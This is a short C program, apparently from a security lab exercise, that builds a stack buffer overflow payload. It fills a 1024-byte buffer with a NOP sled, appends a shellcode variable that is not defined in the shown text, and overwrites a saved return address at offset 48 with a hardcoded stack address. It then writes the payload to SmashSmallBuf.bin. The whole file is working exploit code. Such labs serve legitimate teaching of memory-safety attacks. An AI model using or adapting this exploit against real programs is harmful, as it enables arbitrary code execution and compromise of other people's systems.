#define SMALL_BUFFER_START 0xbfffef2c
#define ATTACK_BUFF_LEN 1024
void ShellCodeSmashSmallBuf() {
char attackStr[ATTACK_BUFF_LEN];
unsigned long *ps;
FILE *badfile;
memset(attackStr, 0x90, ATTACK_BUFF_LEN);
strcpy(attackStr + (ATTACK_BUFF_LEN - strlen(shellcode) - 1), shellcode);
ps = (unsigned long *)(attackStr+48);
*(ps) = SMALL_BUFFER_START + 0x100;
attackStr[ATTACK_BUFF_LEN-1] = 0;
badfile = fopen("./SmashSmallBuf.bin", "w");
fwrite(attackStr, strlen(attackStr), 1, badfile);
fclose(badfile);
}
int main()
{
	ShellCodeSmashSmallBuf();
	return 0;
}
